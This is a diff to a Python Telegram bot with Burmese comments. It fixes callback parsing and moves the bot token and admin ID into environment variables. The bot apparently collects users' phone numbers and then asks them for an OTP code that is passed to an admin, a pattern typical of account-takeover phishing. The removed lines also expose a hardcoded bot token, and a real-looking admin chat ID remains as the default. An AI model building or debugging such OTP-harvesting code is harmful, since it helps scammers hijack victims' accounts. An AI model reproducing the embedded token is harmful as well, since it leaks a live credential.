@@ -1,3 +1,4 @@
+import os
 import html
 import re
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -8,7 +9,7 @@ from telegram.error import TelegramError
 
 # Admin ရဲ့ Chat ID ကို ဤနေရာတွင် ထည့်ပါ။
 # ⚠️ ဤနေရာတွင် သင်ရယူထားသော ဂဏန်းအစစ်ကို ထည့်သွင်းရန် လိုအပ်ပါသည်။
-ADMIN_CHAT_ID = "6022798056"
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6022798056") # FIX: Admin ID ကိုလည်း Environment Variable ကနေ ရယူနိုင်ရန် ပြင်ဆင်ထားပါသည်။
 
 # Inline Button များအတွက် Prefix များ
 APPROVE_PREFIX = "approve_"
@@ -183,7 +184,8 @@ async def request_phone_number(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     await query.answer("ဖုန်းနံပါတ် တောင်းခံနေပါပြီ...")
 
-    user_id = int(query.data.split('_')[2])
+    # callback_data ပုံစံသည် 'request_phone_<user_id>' ဖြစ်သောကြောင့် index 1 တွင် ရှိသည်။
+    user_id = int(query.data.split('_')[1]) 
     user = query.from_user
 
     # Admin ဆီသို့ Notification ပို့ခြင်း
@@ -206,7 +208,8 @@ async def request_otp_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     query = update.callback_query
     await query.answer("OTP code တောင်းခံနေပါပြီ...")
 
-    user_id = int(query.data.split('_')[2])
+    # callback_data ပုံစံသည် 'send_otp_<user_id>' ဖြစ်သောကြောင့် index 1 တွင် ရှိသည်။
+    user_id = int(query.data.split('_')[1])
     user = query.from_user
 
     phone_number = USER_PHONE_NUMBERS.get(user_id, "N/A (Error retrieving phone)")
@@ -340,8 +343,15 @@ async def bot_functionality(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 # =========================================================
 
 def main():
-    application = Application.builder().token("7992993496:AAGLZVKjT2yFY7nf6xMWw58NJF_ZNgmigW0").build()
-
+    # 🔥 FIX: Token ကို Environment Variable ကနေ ဆွဲယူခြင်း
+    BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+    if not BOT_TOKEN:
+        print("❌ ERROR: TELEGRAM_BOT_TOKEN environment variable ကို မတွေ့ပါ။ Bot ကို ရပ်လိုက်ပါသည်။")
+        return
+        
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # ------------------ Handlers ------------------
     # Commands
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("check", bot_functionality))
@@ -350,7 +360,6 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & filters.REPLY, handle_admin_reply))
 
     # Payment Proof - စာသား နှင့် ဓာတ်ပုံ များကို ဖမ်းယူရန်
-    # filters.REPLY ကို ပယ်ထုတ်ထားသောကြောင့် Reply မဟုတ်သော Text သို့မဟုတ် Photo များသာ ဤ Handler သို့ ရောက်ရှိမည်။
     application.add_handler(MessageHandler(filters.PHOTO | filters.TEXT & ~filters.COMMAND & ~filters.REPLY, handle_payment_proof))
 
     # Payment Approval Callback
@@ -360,8 +369,11 @@ def main():
     application.add_handler(CallbackQueryHandler(request_phone_number, pattern=f"^{REQUEST_PHONE_PREFIX}"))
     application.add_handler(CallbackQueryHandler(request_otp_code, pattern=f"^{SEND_OTP_PREFIX}"))
 
-
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # 🔥 FIX: Render/Hosting အတွက် Polling Mode ကို စတင်ခြင်း
+    # 24 နာရီ Hosting အတွက် Polling သည် ရိုးရှင်းသော်လည်း ရံဖန်ရံခါ connection ပြတ်တောက်နိုင်ပါသည်။
+    # Render Free Tier ကို အသုံးပြုသောကြောင့် ပုံမှန်အားဖြင့် Webhook (Port ဖွင့်ခြင်း) လိုအပ်သော်လည်း၊ Polling ဖြင့် စမ်းသပ်ကြည့်ပါ။
+    print("✅ Bot စတင်နေပါပြီ... (Polling Mode)")
+    application.run_polling(allowed_updates=Update.ALL_TYPES) 
 
 if __name__ == '__main__':
     main()
